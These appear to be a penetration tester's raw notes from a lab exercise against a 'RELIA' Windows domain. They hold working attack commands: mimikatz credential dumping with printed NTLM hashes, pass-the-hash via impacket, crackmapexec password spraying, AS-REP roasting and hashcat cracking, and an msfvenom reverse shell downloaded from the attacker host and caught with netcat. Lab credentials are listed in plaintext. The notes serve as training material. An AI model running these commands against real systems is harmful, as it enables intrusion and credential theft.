┌──(kali㉿kali)-[~/…/TUNNELING/Ligolo/PROXY(ME)/ligolo-ng_proxy_0.5.2_linux_amd64]
└─$ sudo ip link set ligolo up

┌──(kali㉿kali)-[~/…/TUNNELING/Ligolo/PROXY(ME)/ligolo-ng_proxy_0.5.2_linux_amd64]
└─$ ./proxy -selfcert
WARN[0000] Using automatically generated self-signed certificates (Not recommended) 
INFO[0000] Listening on 0.0.0.0:11601 
ligolo-ng » INFO[0066] Agent joined.                                 name="RELIA\\jim@WK01" remote="192.168.238.191:62863"
ligolo-ng » session

python3 -m http.server 8000
PS C:\Users\jim\Documents> iwr -uri http://192.168.45.170:8000/agent.exe -Outfile agent.exe
PS C:\Users\jim\Documents> ./agent -connect 192.168.45.214:11601 -ignore-cert

172.16.198.14
sudo ip route add 172.16.198.0/24 dev ligolo
ip route

[Agent : RELIA\jim@WK01] » start
[Agent : RELIA\jim@WK01] » help
[Agent : RELIA\jim@WK01] » tunnel_list


			DUMPING HASHES: Kerbroasting
DONWLOAD:
PS C:\Users\dmzadmin\Desktop> ls
    Directory: C:\Users\dmzadmin\Desktop
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         4/30/2024   8:05 PM          46848 Invoke-Kerberoast.ps1
-a----         4/30/2024   8:12 PM        2204117 Invoke-Mimikatz.ps1
-a----         4/30/2024   7:50 PM        7996928 kerbrute_windows_amd64.exe
-a----         4/29/2024   1:04 AM         927384 mimikatz.exe
-a----         4/12/2024   8:11 PM         770279 PowerView.ps1
-a----         4/30/2024   7:40 PM             34 proof.txt
-a----         4/30/2024   7:54 PM         446976 Rubeus.exe


PS C:\Users\dmzadmin\Desktop> Import-Module .\PowerView.ps1
PS C:\Users\dmzadmin\Desktop> Get-NetLoggedon | select UserName
UserName
--------
dmzadmin
dmzadmin
LOGIN$
LOGIN$
LOGIN$
Administrator
LOGIN$
LOGIN$
LOGIN$
LOGIN$
LOGIN$
LOGIN$

PS C:\Users\dmzadmin\Desktop> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain
Members
-------------------------------------------------------------------------------
Administrator
dmzadmin
RELIA\Domain Admins
The command completed successfully.


PS1:
PS C:\Users\dmzadmin\Desktop> Import-Module .\Invoke-Mimikatz.ps1
PS C:\Users\dmzadmin\Desktop> Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords" "exit"' > hashes.txt
Exception calling "GetMethod" with "1" argument(s): "Ambiguous match found."
At C:\Users\dmzadmin\Desktop\Invoke-Mimikatz.ps1:886 char:6
+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...
+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : AmbiguousMatchException

.EXE:
PS C:\Users\dmzadmin\Desktop> .\mimikatz.exe

  .#####.   mimikatz 2.1.1 (x64) #17763 Dec  9 2018 23:56:50
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list


PS C:\Users\dmzadmin\Desktop> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 1773068 (00000000:001b0e0c)
Session           : RemoteInteractive from 2
User Name         : dmzadmin
Domain            : LOGIN
Logon Server      : LOGIN
Logon Time        : 4/30/2024 7:47:06 PM
SID               : S-1-5-21-806534942-2466310119-3060745499-1000
        msv :
         [00000003] Primary
         * Username : dmzadmin
         * Domain   : LOGIN
         * NTLM     : ae78a6fea976b71e09e990b903020af6
         * SHA1     : 0a0c61f4d0d73b85f00390d6f91cd8f743bf4442
        tspkg :
        wdigest :
         * Username : dmzadmin
         * Domain   : LOGIN
         * Password : (null)
        kerberos :
         * Username : dmzadmin
         * Domain   : LOGIN
         * Password : (null)


Authentication Id : 0 ; 581717 (00000000:0008e055)
Session           : Batch from 0
User Name         : Administrator
Domain            : LOGIN
Logon Server      : LOGIN
Logon Time        : 4/8/2024 9:57:06 AM
SID               : S-1-5-21-806534942-2466310119-3060745499-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : LOGIN
         * NTLM     : b0628840403a01ce55a9d57dc4fb4640
         * SHA1     : 8a9cb469f034c773f3f4e12f1ab6be3493770180
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : LOGIN
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : LOGIN
         * Password : (null)
        ssp :
        credman :
        cloudap :


			RDP: RESTRICTION
xfreerdp /v:192.168.238.191 /u:Administrator /pth:b0628840403a01ce55a9d57dc4fb4640
CAN LOGGON: BUT ACCOUNT RESTRICTION FOR SIGNING IN NO PASSWORD 

			CRACK NTLM: Exhausted
nano admin.hash      
hashcat --help | grep -i "ntlm"    
hashcat -m 1000 admin.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 1000 (NTLM)
Hash.Target......: b0628840403a01ce55a9d57dc4fb4640
Time.Started.....: Tue Apr 30 23:37:29 2024, (35 secs)
Time.Estimated...: Tue Apr 30 23:38:04 2024, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 31440.8 kH/s (6.40ms) @ Accel:512 Loops:77 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 1104517645/1104517645 (100.00%)
Rejected.........: 0/1104517645 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-77 Iteration:0-77
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[212173657879616e67656c2121] -> $HEX[04a156616d6f]
Hardware.Mon.#1..: Util: 83%

				Passing NTLM: WORKED 
kali@kali:~$ impacket-psexec -hashes 00000000000000000000000000000000:b0628840403a01ce55a9d57dc4fb4640 Administrator@192.168.238.191
kali@kali:~$ impacket-wmiexec -hashes 00000000000000000000000000000000:b0628840403a01ce55a9d57dc4fb4640 Administrator@192.168.238.191

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
login



				 SET UP FORT FORWARDING 
xfreerdp /u:dmzadmin /p:SlimGodhoodMope /v:192.168.238.191 /size:80% /drive:kali,.
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.214 LPORT=2560 -f exe > reverse.exe


				SPRAY AND PRAY: 
#Find logedon user hash and premofrm a "Pass the Hash" if NTLM auth in enabled
crackmapexec smb 172.16.198.0/24 -u Administrator -p b0628840403a01ce55a9d57dc4fb4640 --shares
crackmapexec smb 172.16.198.0/24 -u dmzadmin -p SlimGodhoodMope --shares

crackmapexec smb 172.16.198.0/24 -u jim -p 'Castello1!' --shares
SMB         172.16.198.254  445    LOGIN            IPC$            READ            Remote IPC

SMB         172.16.198.5    445    MAIL             [+] relia.com\jim:Castello1! 
SMB         172.16.198.5    445    MAIL             IPC$            READ            Remote IPC

SMB         172.16.198.6    445    DC02             IPC$            READ            Remote IPC
SMB         172.16.198.6    445    DC02             NETLOGON        READ            Logon server share                                                                                            
SMB         172.16.198.6    445    DC02             SYSVOL          READ            Logon server 

SMB         172.16.198.7    445    INTRANET         [+] relia.com\jim:Castello1! 
SMB         172.16.198.7    445    INTRANET         IPC$            READ            Remote IPC

SMB         172.16.198.14   445    WK01             [+] relia.com\jim:Castello1! 
SMB         172.16.198.14   445    WK01             IPC$            READ            Remote IPC

SMB         172.16.198.15   445    WK02             IPC$            READ            Remote IPC

SMB         172.16.198.21   445    FILES            [+] relia.com\jim:Castello1! 
SMB         172.16.198.21   445    FILES            apps            READ            
SMB         172.16.198.21   445    FILES            IPC$            READ            Remote IPC
SMB         172.16.198.21   445    FILES            monitoring      READ            
SMB         172.16.198.21   445    FILES            scripts         READ   

SMB         172.16.198.30   445    WEBBY            [+] relia.com\jim:Castello1! 
SMB         172.16.198.30   445    WEBBY            IPC$            READ            Remote IPC

SMB: no writable shares
impacket-psexec jim:'Castello1!'@172.16.198.254 cmd.exe
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.

WINRM: Error: Exiting with code 1
evil-winrm -i 172.16.198.17 -u jim -p 'Castello1!'

WMI: access denied
impacket-wmiexec relia/jim:'Castello1!'@172.16.198.30

RDP: 254 5 6 7 14 15 21 30
xfreerdp /u:jim /p:'Castello1!' /v:172.16.198.30

SSH: 19 20
ssh jim@172.16.198.19 = Permission denied (publickey).
ssh jim@172.16.198.20 = Permission denied


crackmapexec smb 172.16.198.0/24 -u maildmz -p DPuBT9tGCBrTbR --shares
SMB         172.16.198.254  445    LOGIN            [+] relia.com\maildmz:DPuBT9tGCBrTbR 
SMB         172.16.198.254  445    LOGIN            IPC$            READ            Remote IPC

SMB         172.16.198.5    445    MAIL             [+] relia.com\maildmz:DPuBT9tGCBrTbR 
SMB         172.16.198.5    445    MAIL             IPC$            READ            Remote IPC

SMB         172.16.198.6    445    DC02             [+] relia.com\maildmz:DPuBT9tGCBrTbR 
SMB         172.16.198.6    445    DC02             IPC$            READ            Remote IPC
SMB         172.16.198.6    445    DC02             NETLOGON        READ            Logon server
SMB         172.16.198.6    445    DC02             SYSVOL          READ            Logon server share                                                                                            

SMB         172.16.198.7    445    INTRANET         [+] relia.com\maildmz:DPuBT9tGCBrTbR 
SMB         172.16.198.7    445    INTRANET         IPC$            READ            Remote IPC

SMB         172.16.198.14   445    WK01             [+] relia.com\maildmz:DPuBT9tGCBrTbR 
SMB         172.16.198.14   445    WK01             IPC$            READ            Remote IPC

SMB         172.16.198.15   445    WK02             [+] relia.com\maildmz:DPuBT9tGCBrTbR 
SMB         172.16.198.15   445    WK02             IPC$            READ            Remote IPC

SMB         172.16.198.21   445    FILES            [+] relia.com\maildmz:DPuBT9tGCBrTbR 
SMB         172.16.198.21   445    FILES            apps            READ            
SMB         172.16.198.21   445    FILES            IPC$            READ            Remote IPC
SMB         172.16.198.21   445    FILES            monitoring      READ            
SMB         172.16.198.21   445    FILES            scripts         READ  

SMB         172.16.198.30   445    WEBBY            [+] relia.com\maildmz:DPuBT9tGCBrTbR 
SMB         172.16.198.30   445    WEBBY            IPC$            READ            Remote IPC

SMB: no writable shares
impacket-psexec maildmz:'DPuBT9tGCBrTbR'@172.16.198.21 cmd.exe
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.

WINRM: Error: Exiting with code 1
evil-winrm -i 172.16.198.17 -u maildmz -p 'DPuBT9tGCBrTbR'

WMI: access denied
impacket-wmiexec relia/maildmz:'DPuBT9tGCBrTbR'@172.16.198.30

RDP: 254 5 6 7 14 15 21 30
xfreerdp /u:maildmz /p:'DPuBT9tGCBrTbR' /v:172.16.198.30

SSH: 19 20
ssh maildmz@172.16.198.19 = Permission denied (publickey).
ssh maildmz@172.16.198.20 = Permission denied


--------------------------------------------------------------------------------------------------
				INTERNAL IPS: 128
--------------------------------------------------------------------------------------------------
.6: proof only: DC- DNS:53, KERB:88, LDAP:389, RDP:3389, HTTP:5985 47001, SMB:139 445, RPC:135, kpasswd5?:464, wrapped:636, wrapped:3269, mc-nmf:9389
.7: local and proof: RDP:3389, DB:mysql 3306, HTTP:80 443 5985 47001, SMB:139 445, RPC:135 ✅
.14: local and proof: WK01 ✅ 
.15: local ✅and proof: RDP:3389, SMB:139 445, RPC:135, ???: 5040 
.19: local and proof: SSH:22 
.20: local and proof: SSH:22, Socks5:33060
.21: proof only: HTTP:5985 47001, RPC:135, SMB:139 445 ✅
.30: proof only: WEBBY- RDP: 3389, HTTP: 80 47001, DB: Mongo DB 27017, SMB: 139 445, RPC: 135


			PORT FORWADING: RDP: .191
xfreerdp /u:dmzadmin /p:SlimGodhoodMope /v:192.168.162.191 /size:80% /drive:kali,.

REVERSE SHELL:
python3 -m http.server 8000
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.170 LPORT=2560 -f exe > reverse.exe
iwr -uri http://192.168.45.170:8000/reverse.exe -Outfile rev.exe
nc -nvlp 2560 
C:\Users\dmzadmin\Downloads> powershell -ep bypass

PORT FORWARD: 
┌──(kali㉿kali)-[~/…/TUNNELING/Ligolo/PROXY(ME)/ligolo-ng_proxy_0.5.2_linux_amd64]
└─$ sudo ip tuntap add user kali mode tun ligolo
[sudo] password for kali: 
┌──(kali㉿kali)-[~/…/TUNNELING/Ligolo/PROXY(ME)/ligolo-ng_proxy_0.5.2_linux_amd64]
└─$ sudo ip link set ligolo up
┌──(kali㉿kali)-[~/…/TUNNELING/Ligolo/PROXY(ME)/ligolo-ng_proxy_0.5.2_linux_amd64]
└─$ ./proxy -selfcert

┌──(kali㉿kali)-[~/…/TUNNELING/Ligolo/AGENT(VIC)/WINDOWSamd64]
└─$ python3 -m http.server 8000
PS C:\Users\dmzadmin\Downloads> iwr -uri http://192.168.45.170:8000/agent.exe -Outfile agent.exe
PS C:\Users\jim\Documents> ./agent -connect 192.168.45.214:11601 -ignore-cert

┌──(kali㉿kali)-[~/…/TUNNELING/Ligolo/AGENT(VIC)/WINDOWSamd64]
└─$ sudo ip route add 172.16.122.0/24 dev ligolo
┌──(kali㉿kali)-[~/…/TUNNELING/Ligolo/AGENT(VIC)/WINDOWSamd64]
└─$ ip route

[Agent : RELIA\jim@WK01] » session
[Agent : RELIA\jim@WK01] » start
[Agent : RELIA\jim@WK01] » tunnel_list

REMEOVE IP ROUTE: 
sudo ip route del 172.16.154.0/24 dev ligolo

DOOMAIN USERS:
Administrator✅
andrea✅
anna
brad
dan
Guest
iis_service
internaladmin
jenny
jim✅
krbtgt
larry
maildmz✅
michelle✅
milana
mountuser✅

PASSWORD:
dmzadmin:SlimGodhoodMope
maildmz:DPuBT9tGCBrTbR
jim:Castello1!
michelle:NotMyPassword0k?
andrea:PasswordPassword_6 
amy:backups1
andrew:Rb9kNokjDsjYyH

SPRAY: 
mountuser:DRtajyCwcbWvH/9
Administrator:vau!XCKjNQBv2$


--------------------------------------------------------------------------------------------------
				172.16.128.6 - proof only - DC02
DNS: 53
KERBEROS: 88
LDAP: 389
RDP: 3389
HTTP: 5985 47001
SMB: 139 445
RPC: 135
464  kpasswd5? 
636  tcpwrapped
3269 tcpwrapped 
9389 mc-nmf

DNS:
53/tcp    open  domain        syn-ack Simple DNS Plus
KERBEROS:
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-04-29 01:29:05Z)
LDAP:
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: relia.com0., Site: Default-First-Site-Name)
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: relia.com0., Site: Default-First-Site-Name)

				PORTS OPEN:
┌──(kali㉿kali)-[~]
└─$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 172.16.128.6

RDP:
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RELIA
|   NetBIOS_Domain_Name: RELIA
|   NetBIOS_Computer_Name: DC02
|   DNS_Domain_Name: relia.com
|   DNS_Computer_Name: DC02.relia.com
|   DNS_Tree_Name: relia.com
|   Product_Version: 10.0.20348
|_  System_Time: 2024-04-29T01:30:02+00:00
|_ssl-date: 2024-04-29T01:30:42+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC02.relia.com
| Issuer: commonName=DC02.relia.com
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-03-29T18:28:55
| Not valid after:  2024-09-28T18:28:55
| MD5:   c099:00d3:e4c3:be3a:f3e2:d46d:e19e:1cc9
| SHA-1: c4b6:2699:0f94:1b5a:b56b:6d35:cb34:1d82:d66c:fa64

HTTP: 5985 47001 - Not Found
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0

SMB: 139 445
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
Host script results:
| nbstat: NetBIOS name: DC02, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:4d:2d (VMware)
| Names:
|   DC02<00>             Flags: <unique><active>
|   DC02<20>             Flags: <unique><active>
|   RELIA<00>            Flags: <group><active>
|   RELIA<1c>            Flags: <group><active>
|   RELIA<1b>            Flags: <unique><active>
| Statistics:
|   00:50:56:ab:4d:2d:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-time: 
|   date: 2024-04-29T01:30:02
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 58151/tcp): CLEAN (Timeout)
|   Check 2 (port 22518/tcp): CLEAN (Timeout)
|   Check 3 (port 47241/udp): CLEAN (Timeout)
|   Check 4 (port 45574/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

RPC: 135
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
49673/tcp open  msrpc         syn-ack Microsoft Windows RPC
50146/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
50151/tcp open  msrpc         syn-ack Microsoft Windows RPC
50158/tcp open  msrpc         syn-ack Microsoft Windows RPC
50163/tcp open  msrpc         syn-ack Microsoft Windows RPC
50180/tcp open  msrpc         syn-ack Microsoft Windows RPC

464/tcp   open  kpasswd5?     syn-ack
636/tcp   open  tcpwrapped    syn-ack
3269/tcp  open  tcpwrapped    syn-ack
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing


WMI:
evil-winrm -i 172.16.128.6  -u jim -p 'Castello1!' 

RPC:
impacket-wmiexec RELIA/jim:'Castello1!'@172.16.128.6

SMB
impacket-psexec dmzadmin:'SlimGodhoodMope'@172.16.128.6 cmd.exe
[*] Requesting shares on 172.16.128.6.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'SYSVOL' is not writable.

impacket-psexec jim:'Castello1!'@172.16.128.6 cmd.exe

smbmap -u 'jim' -p 'Castello1!' -H 172.16.128.6 
[+] IP: 172.16.128.6:445        Name: 172.16.128.6              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 

┌──(kali㉿kali)-[~]
└─$ smbclient -U 'jim' \\\\172.16.128.6\\IPC$ 
Password for [WORKGROUP\jim]: Castello1!

┌──(kali㉿kali)-[~] NOTHING
└─$ smbclient -U 'jim' \\\\172.16.128.6\\NETLOGON
Password for [WORKGROUP\jim]: Castello1!

┌──(kali㉿kali)-[~]
└─$ smbclient -U 'jim' \\\\172.16.128.6\\SYSVOL
Password for [WORKGROUP\jim]: Castello1!
  DfsrPrivate                      DHSr        0  Mon Oct 17 08:25:12 2022
cd \relia.com\DfsrPrivate\: NT_STATUS_ACCESS_DENIED
smb: \relia.com\> get DfsrPrivate
NT_STATUS_FILE_IS_A_DIRECTORY opening remote file \relia.com\DfsrPrivate


			CME: domain contriller
Let's spray the creds you discovered using crackmapexec and netexec. 
Also note you can use --shares flag with crackmapexec to list the shares if it is what you looking for.

dmzadmin:SlimGodhoodMope
jim:Castello1!

sudo crackmapexec smb 172.16.128.6 -u 'jim' -p 'Castello1!' -d relia.com --shares

crackmapexec ldap DC02.relia.com -u jim -p 'Castello1!' --asreproast asreproast.out

SMB:
sudo crackmapexec smb 172.16.128.6 -u users.txt -p pass.txt -d relia.com --shares
SMB         172.16.128.6    445    DC02             [+] DC02.relia.com\maildmz:DPuBT9tGCBrTbR 
SMB         172.16.128.6    445    DC02             [+] DC02.relia.com\jim:Castello1! 
SMB         172.16.128.6    445    DC02             [+] DC02.relia.com\andrea:PasswordPassword_6 
SMB         172.16.128.6    445    DC02             [+] DC02.relia.com\michelle:NotMyPassword0k? 

WINRM:
sudo crackmapexec winrm 172.16.128.6 -u users.txt -p pass.txt -d DC02.relia.com --continue-on-succes

				NETEXC:
sudo netexec smb 172.16.128.6 -u users.txt -p pass.txt -d relia.com --shares



	Active Directory Authentication (Password Attacks, AS-REP Roasting)

				AS-REP Roasting
┌──(kali㉿kali)-[~]
└─$ impacket-GetNPUsers -dc-ip 172.16.128.6 -request relia.com/jim:'Castello1!'
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

┌──(kali㉿kali)-[~/Desktop/RELIA]
└─$ nano hashes.asreproast
$krb5asrep$23$michelle@RELIA.COM:7d0d2de1eca4d664ad77b3136f934e00$c30ce651f19692f6ebcd79189e62edd0e4269053dccc252f8a79ebdd8e08ddd99d049223a87f1269639e6d381bb0e3cc197b95f523c2c5655fe368f57cdc99479f7b5116d12523095b54e24b89342e2b85f1a04dd8d1a993d22f0f135b32c39c26ea052daa66ba48cf7e713ff7f0dbcc28c2b79adb65852e06ed317643cfc2a50c5aa0b6d213a2af9d18643e7546d46772e8776a71d4855d3eb92c060cd7ba0661598ac1af9f80229831cbb54d0f3bd646a041554c90e1986c3daa4ed958049f1a121e0a832d05c802ced172b98a3d7b16b54433ccf799f80c64d4ce6b3b39787694da91556f

┌──(kali㉿kali)-[~/Desktop/RELIA]
└─$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force 
$krb5asrep$23$michelle@RELIA.COM:7d0d2de1eca4d664ad77b3136f934e00$c30ce651f19692f6ebcd79189e62edd0e4269053dccc252f8a79ebdd8e08ddd99d049223a87f1269639e6d381bb0e3cc197b95f523c2c5655fe368f57cdc99479f7b5116d12523095b54e24b89342e2b85f1a04dd8d1a993d22f0f135b32c39c26ea052daa66ba48cf7e713ff7f0dbcc28c2b79adb65852e06ed317643cfc2a50c5aa0b6d213a2af9d18643e7546d46772e8776a71d4855d3eb92c060cd7ba0661598ac1af9f80229831cbb54d0f3bd646a041554c90e1986c3daa4ed958049f1a121e0a832d05c802ced172b98a3d7b16b54433ccf799f80c64d4ce6b3b39787694da91556f:NotMyPassword0k?

Be sure to spray the newly discovered user / pass against the machines. 
When spraying against RDP, best to use hydra or attempt manually. 
Seems netexec and CME may not be the best route for spraying against RDP

				RDP: ACCESS
xfreerdp /u:michelle /p:'NotMyPassword0k?' /v:172.16.128.7 /size:80% /drive:kali,.


--------------------------------------------------------------------------------------------------
		172.16.128.7 - michelle:local.txt - Admin:proof.txt INTRANET ✅
||If you have root 7 and dumped the credentials. then you should move to 15||

RDP: 3389
DB: mysql 3306
HTTP: 80 443 5985 47001
SMB: 139 445
RPC: 135

┌──(kali㉿kali)-[~]
└─$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 172.16.128.7

RDP: 3389
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RELIA
|   NetBIOS_Domain_Name: RELIA
|   NetBIOS_Computer_Name: INTRANET
|   DNS_Domain_Name: relia.com
|   DNS_Computer_Name: INTRANET.relia.com
|   DNS_Tree_Name: relia.com
|   Product_Version: 10.0.20348
|_  System_Time: 2024-04-29T02:00:59+00:00
| ssl-cert: Subject: commonName=INTRANET.relia.com
| Issuer: commonName=INTRANET.relia.com
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-04-03T15:35:21
| Not valid after:  2024-10-03T15:35:21
| MD5:   bba7:07da:b305:8152:66ff:0961:1ab1:2d86
| SHA-1: 8d86:131c:08f8:b3a6:955e:8df6:df1e:b873:c71e:c235
|_ssl-date: 2024-04-29T02:01:39+00:00; -1s from scanner time.

DB: mysql 3306
3306/tcp  open  mysql         syn-ack MariaDB (unauthorized)

HTTP: 80 5985 47001
80/tcp    open  http          syn-ack Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
| http-title: RELIA INTRANET &#8211; Just another WordPress site
|_Requested resource was http://172.16.128.7/wordpress/
|_http-generator: WordPress 6.0.3
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
443/tcp   open  ssl/http      syn-ack Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
| http-title: RELIA INTRANET &#8211; Just another WordPress site
|_Requested resource was https://172.16.128.7/wordpress/
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
|_ssl-date: TLS randomness does not represent time
|_http-generator: WordPress 6.0.3
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
| SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0

SMB: 139 445
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 22775/tcp): CLEAN (Timeout)
|   Check 2 (port 44330/tcp): CLEAN (Timeout)
|   Check 3 (port 59692/udp): CLEAN (Timeout)
|   Check 4 (port 18694/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2024-04-29T02:00:59
|_  start_date: N/A
| nbstat: NetBIOS name: INTRANET, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:a6:85 (VMware)
| Names:
|   INTRANET<20>         Flags: <unique><active>
|   INTRANET<00>         Flags: <unique><active>
|   RELIA<00>            Flags: <group><active>
| Statistics:
|   00:50:56:ab:a6:85:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00

RPC: 135
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack Microsoft Windows RPC


				RDP: ACCESS
xfreerdp /u:michelle /p:'NotMyPassword0k?' /v:172.16.114.7 /size:80% /drive:kali,.

Local.txt
5e1159e996cfedb9f0061b192e74def3

				BASIC INFO:
PS C:\Users\michelle> whoami
relia\michelle

PS C:\Users\michelle> hostname
INTRANET

PS C:\Users\michelle> systeminfo
Host Name:                 INTRANET
OS Name:                   Microsoft Windows Server 2022 Standard
